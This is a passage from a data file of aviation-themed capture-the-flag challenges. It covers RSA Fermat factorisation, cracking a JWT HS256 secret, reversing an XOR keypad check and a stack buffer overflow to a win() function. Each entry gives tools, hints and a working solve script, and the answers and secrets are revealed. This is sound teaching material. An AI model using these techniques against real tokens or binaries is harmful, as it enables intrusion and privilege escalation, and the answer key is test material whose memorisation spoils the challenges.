  learn:"RSA security relies on n = p×q being hard to factor. Two mistakes break that: primes that are too small, or primes that are too close. Close primes fall to Fermat factorisation (n ≈ a², so try a from √n upward until a²−n is a perfect square, giving p=a−b, q=a+b). Then d = e⁻¹ mod (p−1)(q−1) and m = cᵈ mod n.",
  hints:["The hint is in the story: the primes are CLOSE. That is the Fermat case.","RsaCtfTool --n <N> --e <E> --uncipher <C> does it in one go.","Or implement Fermat: a=isqrt(n)+1; while a*a-n isn't a perfect square: a+=1."],
  solve:"python3 -c \"import re;from math import isqrt;d=open('pubkey_and_cipher.txt').read();g=lambda k:int(re.search(k+r' = (\\d+)',d)[1]);n,e,c=g('n'),g('e'),g('c');a=isqrt(n)+1\nwhile True:\n b2=a*a-n;b=isqrt(b2)\n if b*b==b2:break\n a+=1\np,q=a-b,a+b;dd=pow(e,-1,(p-1)*(q-1));m=pow(c,dd,n);print(m.to_bytes((m.bit_length()+7)//8,'big').decode())\""
},
{
  id:"25-crew-portal-jwt", cat:"offensive", title:"Crew Portal Token", diff:2, points:175,
  files:["captured_token.txt"],
  story:"A JSON Web Token was captured from the crew portal's 'remember me' cookie. It is signed with HS256, and the server reuses a weak secret.",
  question:"Crack the signing secret. Submit it as AVIANS{secret}.",
  tools:[
    {name:"jwt_tool", why:"Inspects, cracks and forges JWTs.", cmd:"jwt_tool TOKEN -C -d aviation_wordlist.txt"},
    {name:"hashcat", why:"Mode 16500 cracks HS256 JWTs against a wordlist.", cmd:"hashcat -m 16500 token.txt aviation_wordlist.txt"},
    {name:"jwt.io", why:"Paste the token to read its header and payload (don't paste secrets anywhere online).", cmd:"base64 -d each of the first two dot-separated parts"}
  ],
  learn:"A JWT is header.payload.signature, each Base64URL. With HS256 the signature is HMAC-SHA256(secret, header.payload). If the secret is weak you can brute-force it offline, then forge any token you like (e.g. change \"role\":\"viewer\" to \"admin\"). Defence: long random secrets, and reject 'alg':'none'.",
  hints:["Decode the first two parts to see the payload (role: viewer). The prize is the secret that signs it.","Crack with the shared aviation wordlist: jwt_tool TOKEN -C -d challenges/_shared/aviation_wordlist.txt","The secret is a single aviation word plus a year."],
  solve:"jwt_tool \"$(tail -1 captured_token.txt)\" -C -d challenges/_shared/aviation_wordlist.txt\n# secret = jetstream2026  -> once cracked you could forge role:admin"
},
{
  id:"26-hangar-keypad", cat:"offensive", title:"Hangar Keypad", diff:2, points:200,
  files:["keypad","README.txt"],
  story:"A door-keypad controller binary from hangar 3. Enter the right access code and it reveals a flag — but the flag is obfuscated, so 'strings' won't hand it to you.",
  question:"Reverse the binary, find the access code, run it, and read the flag.",
  tools:[
    {name:"Ghidra", why:"Free decompiler: turns the binary back into readable C.", cmd:"ghidra  (import, analyse, look at check())"},
    {name:"radare2 / rizin", why:"CLI reverse engineering; disassemble and inspect.", cmd:"r2 -A keypad; then 'pdf @ sym.check'"},
    {name:"file / checksec / ltrace", why:"Identify it first, then watch what it compares.", cmd:"file keypad; ltrace ./keypad"}
  ],
  learn:"Static RE is reading a program without running it (or alongside running it). The check here transforms your input byte-by-byte (XOR with a constant) and compares against a table, so the password isn't a visible string — you recover it by reversing the transform. The flag is stored XOR'd and only de-obfuscated at runtime when the code path for 'correct' executes. chmod +x the file first.",
  hints:["chmod +x keypad && file keypad. It reads a line and calls a check() function.","In the decompiler, check() does (input[i] ^ 0x2B) == table[i]. So input[i] = table[i] ^ 0x2B. Recover each character.","The code is CamelCase with a 3-digit aircraft number on the end. Enter it to print the flag."],
  solve:"chmod +x keypad\n# From check(): password[i] = const_table[i] ^ 0x2B  ->  OpenSesame172\necho 'OpenSesame172' | ./keypad"
},
{
  id:"27-jetway-overflow", cat:"offensive", title:"Jetway Overflow", diff:3, points:250,
  files:["jetway","README.txt"],
  story:"A jetway docking controller reads an aircraft name into a 64-byte buffer with gets() — no bounds check. There is a win() function that is never called.",
  question:"Overflow the buffer to redirect execution to win(), which prints the flag. 64-bit, no PIE, no stack canary.",
  tools:[
    {name:"pwntools", why:"The standard Python exploit-dev toolkit: build the payload and talk to the process.", cmd:"from pwn import *; e=ELF('./jetway'); p=process('./jetway')"},
    {name:"checksec", why:"Confirm the mitigations (here: no canary, no PIE) that make this straightforward.", cmd:"checksec --file=./jetway"},
    {name:"gdb / pwndbg", why:"Find the exact offset from the buffer to the saved return address.", cmd:"pwndbg; cyclic 200; run; look at $rsp; cyclic -l <value>"}
  ],
  learn:"A stack buffer overflow overwrites the saved return address, so when the function returns the CPU jumps where you point it. Classic steps: (1) find the offset from your input to the return address (cyclic pattern), (2) get the address of win() (no PIE means it's fixed: nm/objdump), (3) send offset bytes of padding + that address (little-endian, 64-bit). Here the offset is 72. Defence: stack canaries, ASLR/PIE, and never gets().",
  hints:["chmod +x jetway; checksec --file=./jetway (no canary, no PIE — so just overwrite the return address).","Get win()'s address: nm jetway | grep win   (it's fixed because PIE is off).","Offset is 72 bytes, then the 8-byte little-endian address of win()."],
  solve:"chmod +x jetway\npython3 -c \"import subprocess;a=int([l.split()[0] for l in subprocess.run(['nm','jetway'],capture_output=True,text=True).stdout.splitlines() if l.endswith(' T win')][0],16);open('p','wb').write(b'A'*72+a.to_bytes(8,'little'))\"\n./jetway < p\n# or with pwntools: p.sendline(b'A'*72 + p64(e.symbols['win']))"
}
];
